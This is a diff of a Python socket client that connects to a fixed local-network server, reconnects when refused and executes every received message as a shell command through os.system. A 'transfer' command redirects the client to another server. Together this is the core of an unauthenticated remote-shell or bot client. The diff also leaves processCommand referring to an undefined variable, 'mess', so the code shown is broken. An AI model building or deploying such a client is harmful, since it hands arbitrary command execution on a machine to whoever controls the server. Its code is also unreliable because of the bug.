@@ -8,6 +8,7 @@ isConnected = 0
 sock = None
 running = 1
 isSetup = 0
+server_address = ('192.168.1.8', 10000)
 
 
 def connect():
@@ -18,7 +19,6 @@ def connect():
         isConnected = 0
         setupThreadOne()
         # Connect the socket to the port where the server is listening
-        server_address = ('192.168.1.8', 10000)
         print('connecting to %s port %s' % server_address)
         try:
             sock.connect(server_address)
@@ -28,6 +28,7 @@ def connect():
             running()
         except Exception as e:
             if e.errno is 111:
+                print(str(e))
                 time.sleep(5)
                 connect()
             else:
@@ -76,10 +77,16 @@ def setupThreadTwo():
       print("Error: ", Exception.error)
 ###END setupThreadTwo
 
-def exitClient(args):
-    global sock, isConnected, running
+def disconnect():
+    global sock, isConnected
     sock.close()
     isConnected = 0
+    print("Disconnected!")
+###END disconnect
+
+def exitClient(args):
+    global running
+    disconnect()
     running = 0
 ###END exit
 
@@ -105,12 +112,30 @@ def inputFunc():
     return
 ###END inputFunc
 
+def processCommand(cmd, args):
+    global server_address
+    if cmd == "PING":
+        None
+    elif cmd == "transfer":
+        server_address = (str(args[0]), 10000)
+        disconnect()
+    else:
+        print("Got: ", mess)
+        os.system(mess)
+
+
+###END processCommand
 def recvFunc():
     while isConnected:
         mess = sock.recv(1024).decode()
-        if mess != "PING":
-            print("Got: ", mess)
-            os.system(mess)
+        line = mess.split()
+        if len(line) >= 1:
+            cmd = line[0]
+            line.remove(cmd)
+            args = line
+            #print("Command: ", cmd)
+            #print("Args: ", args)
+            processCommand(cmd, args)
 
 ###END recvFunc
 
